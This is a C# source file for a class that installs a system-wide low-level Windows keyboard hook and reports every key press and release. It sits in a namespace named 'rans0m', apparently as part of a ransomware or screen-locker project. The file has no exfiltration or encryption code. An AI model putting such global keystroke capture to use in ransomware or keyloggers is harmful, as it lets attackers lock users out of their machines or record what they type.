using System.Diagnostics;
using System.Runtime.InteropServices;

namespace rans0m
{
    public class KeyboardHook : IDisposable
    {
        private const int WH_KEYBOARD_LL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private LowLevelKeyboardProc? _proc;
        private IntPtr _hookID = IntPtr.Zero;
        private bool _disposed = false;

        public event Action<Keys>? KeyPressed;
        public event Action<Keys>? KeyReleased;

        public void Hook()
        {
            if (_hookID != IntPtr.Zero) return; // already hooked
            _proc = HookCallback;

            // For low-level hook, hMod should be IntPtr.Zero or GetModuleHandle(null)
            // Using GetModuleHandle with MainModule name fails for single-file publish
            IntPtr moduleHandle = IntPtr.Zero;
            try
            {
                // Try GetModuleHandle(null) - works for WH_KEYBOARD_LL
                moduleHandle = GetModuleHandle(null);
                // Fallback to current process module if needed
                if (moduleHandle == IntPtr.Zero)
                {
                    using (Process curProcess = Process.GetCurrentProcess())
                    {
                        var modName = curProcess.MainModule?.ModuleName;
                        if (!string.IsNullOrEmpty(modName))
                            moduleHandle = GetModuleHandle(modName);
                    }
                }
            }
            catch { moduleHandle = IntPtr.Zero; }

            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, moduleHandle, 0);

            if (_hookID == IntPtr.Zero)
            {
                int err = Marshal.GetLastWin32Error();
                Debug.WriteLine($"[KeyboardHook] SetWindowsHookEx failed. Error: {err}");
                // Don't throw - allow app to continue without hook (degraded but not crash)
                // throw new InvalidOperationException($"SetWindowsHookEx failed. Error: {err}");
            }
            else Debug.WriteLine($"[KeyboardHook] Hook installed: {_hookID}");
        }

        public void Unhook()
        {
            if (_hookID != IntPtr.Zero)
            {
                try { UnhookWindowsHookEx(_hookID); } catch { }
                _hookID = IntPtr.Zero;
                Debug.WriteLine("[KeyboardHook] Unhooked");
            }
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            Unhook();
            GC.SuppressFinalize(this);
        }

        ~KeyboardHook()
        {
            Unhook();
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                try
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    Keys key = (Keys)vkCode;

                    switch (wParam.ToInt32())
                    {
                        case 256: // WM_KEYDOWN
                        case 260: // WM_SYSKEYDOWN
                            try { KeyPressed?.Invoke(key); } catch (Exception ex) { Debug.WriteLine($"[Hook] KeyPressed error: {ex.Message}"); }
                            break;
                        case 257: // WM_KEYUP
                        case 261: // WM_SYSKEYUP
                            try { KeyReleased?.Invoke(key); } catch { }
                            break;
                    }
                }
                catch { }
            }

            try { return CallNextHookEx(_hookID, nCode, wParam, lParam); }
            catch { return IntPtr.Zero; }
        }

        // DllImports
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn,
            IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string? lpModuleName);
    }
}
